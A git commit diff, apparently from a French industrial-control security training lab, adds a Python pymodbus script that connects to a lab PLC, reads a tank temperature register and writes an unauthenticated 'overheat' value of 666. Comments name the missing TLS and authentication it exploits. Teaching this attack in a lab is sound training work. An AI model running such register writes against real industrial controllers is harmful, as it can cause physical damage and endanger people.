bf3dbfb2d660999b4a52c17f8e1b0e3c9bc3eace
les-genies-du-web <contact@lesgeniesduweb.fr>
2026-01-13 15:27:36 +0100

    maj lab1

--- J2-Exercices/lab1/ecoute.py
+++ J2-Exercices/lab1/ecoute.py
@@ -1,8 +1,21 @@
-# Dans le terminal attacker, lancez python
-import socket
-
-# Simulation d'un client légitime qui demande la température
 from pymodbus.client import ModbusTcpClient
-client = ModbusTcpClient('lab_plc')
-client.write_register(0, 555) # L'opérateur règle la temp à 555
-client.close()
+import time
+
+# 1. Connexion (Vulnérabilité : Pas de certificat SSL demandé)
+print("--- CONNEXION ---")
+client = ModbusTcpClient('lab_plc', port=502)
+client.connect()
+
+# 2. Lecture (Vulnérabilité : Lecture libre)
+print("--- LECTURE ÉTAT INITIAL ---")
+valeur_avant = client.read_holding_registers(0, 1)
+print(f"Température actuelle de la cuve : {valeur_avant.registers[0]} °C")
+
+# 3. Attaque (Vulnérabilité : No Auth - Pas de mot de passe)
+print("--- INJECTION DE LA COMMANDE DE SURCHAUFFE ---")
+client.write_register(0, 666)
+print("Commande envoyée : Régler température à 666 °C")
+
+# 4. Vérification
+valeur_apres = client.read_holding_registers(0, 1)
+print(f"Nouvelle température de la cuve : {valeur_apres.registers[0]} °C")
